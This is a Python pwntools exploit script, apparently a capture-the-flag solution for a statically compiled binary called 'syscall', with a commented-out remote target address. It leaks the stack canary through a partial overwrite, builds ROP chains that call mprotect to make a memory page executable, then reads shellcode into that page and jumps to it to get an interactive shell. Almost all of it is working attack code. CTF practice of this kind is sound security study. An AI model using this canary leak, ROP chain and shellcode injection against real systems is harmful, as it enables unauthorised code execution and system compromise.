from pwn import *
from base64 import b64encode
context.arch='amd64'

# the program was complied staticlly, there are not system or the syscall number of execve,
# but we could change some segiment's policy to write shellcode and execute, this way could get shell locally,
# I could not connect to the server, so I don't konw if it's work on server yet.

p = process('../Desktop/syscall')
# p = remote('149.129.103.121',10009)
elf = ELF('../Desktop/syscall',checksec=False)

main = elf.sym['main']
mprotect_addr = elf.sym['mprotect']
read_addr = elf.sym['read']

pop_rdx_rsi = 0x0000000000443409 # pop rdx ; pop rsi ; ret
pop_rdi = 0x0000000000401e36 # pop rdi ; ret
shellcode_addr = 0x00000000006CA000
shellcode = asm(shellcraft.sh())

# leak the value of canary
p.recvuntil(">")
p.sendline(b64encode('A'*8+'B'))	# cover the canary lowest byte,to leak it
p.recvuntil("B")
canary = u64('\x00'+p.recv(7))
log.success('canary = %#x',canary)

p.recvuntil("continue ?")
p.sendline('A')
p.recvuntil(">")

# change the policy which start at 0x00000000006CA000 and end at 0x00000000006CA000+len(shellcode)
payload = 'A'*0x8 + p64(canary) + 'A'*0x8
payload += flat([
	pop_rdx_rsi, 0x7, len(shellcode), pop_rdi, shellcode_addr, mprotect_addr, main
	])
p.sendline(b64encode(payload))

p.recvuntil("continue ?")
# end the circulation to make stack overflow
p.sendline('no')
sleep(1)

# write shellcode to address 0f 0x00000000006CA000 and execute it
p.recvuntil(">")
payload = 'A'*0x8 + p64(canary) + 'A'*0x8
payload += flat([
	pop_rdx_rsi, len(shellcode), shellcode_addr, pop_rdi, 0, read_addr, shellcode_addr
	])
p.sendline(b64encode(payload))

p.recvuntil("continue ?")
# end the circulation to make stack overflow
p.sendline('no')
sleep(1)

p.send(shellcode)

sleep(1)
p.interactive()
